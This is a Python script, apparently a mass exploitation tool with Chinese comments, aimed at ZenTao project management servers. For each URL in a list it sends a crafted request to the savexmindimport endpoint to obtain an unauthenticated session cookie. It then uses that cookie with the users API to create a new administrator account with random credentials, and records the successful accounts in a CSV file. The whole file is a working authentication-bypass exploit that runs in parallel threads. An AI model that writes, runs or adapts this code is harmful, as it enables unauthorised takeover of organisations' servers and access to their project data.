import requests
import random
import string
import argparse
import logging
import csv
from concurrent.futures import ThreadPoolExecutor

# 设置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def read_urls_from_file(file_path):
    """ 从文件中读取URL列表 """
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file.readlines() if line.strip()]
    except FileNotFoundError:
        logging.error(f"文件 {file_path} 未找到。")
        return None
    except Exception as e:
        logging.error(f"读取文件时出错：{e}")
        return None

def generate_random_string(length=8):
    """ 生成随机字符串用于账户和密码 """
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def check_vulnerability(url):
    """ 检查禅道API的漏洞 """
    try:
        exploit_url = f"{url}/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=upkbbehwgfscwizoglpw&branch=zqbcsfncxlpopmrvchsu"
        response = requests.get(exploit_url)
        if response.status_code == 200 and 'Set-Cookie' in response.headers and 'zentaosid=' in response.headers['Set-Cookie']:
            zentaosid = response.headers['Set-Cookie'].split('zentaosid=')[1].split(';')[0]
            return zentaosid
    except requests.exceptions.RequestException as e:
        logging.error(f"网络请求错误：{e}")
    return None

def write_to_csv(url, account, password, realname):
    """ 将成功的结果写入CSV文件 """
    with open('result.csv', 'a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([url, account, password, realname])

def determine_api_route(url):
    """ 根据URL确定API路由 """
    for route in ['/max/', '/biz/', '/zentao/']:
        if route in url:
            return f"{route}api.php/v1/users"
    return "/api.php/v1/users"  # 默认路由

def exploit_vulnerable_site(url, zentaosid):
    """ 对单一站点发送POST数据 """
    account, password, realname = generate_random_string(), generate_random_string(12), generate_random_string(10)
    data = {"account": account, "password": password, "realname": realname, "role": "top", "group": "1"}
    headers = {"Cookie": f"zentaosid={zentaosid}; lang=zh-cn; device=desktop; theme=default", "Content-Type": "application/json"}
    api_route = determine_api_route(url)
    post_url = f"{url}api.php/v1/users"
    try:
        response = requests.post(post_url, json=data, headers=headers)
        if response.status_code == 201:
            logging.info(f"成功创建用户：{account}, 密码：{password}, 真实姓名：{realname}，URL: {post_url}")
            write_to_csv(url, account, password, realname)
        else:
            logging.warning(f"用户创建失败，状态码: {response.status_code}, URL: {post_url}")
    except requests.exceptions.RequestException as e:
        logging.error(f"POST请求失败：{e}")

def process_url(url):
    """ 处理单个URL的完整测试流程 """
    zentaosid = check_vulnerability(url)
    if zentaosid:
        logging.info(f"找到漏洞站点: {url}")
        exploit_vulnerable_site(url, zentaosid)

def main(file_path):
    urls = read_urls_from_file(file_path)
    if urls:
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(process_url, urls)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ZenTao Vulnerability Scanner")
    parser.add_argument('-f', '--file', type=str, required=True, help="File path containing URLs to check.")
    args = parser.parse_args()
    main(args.file)
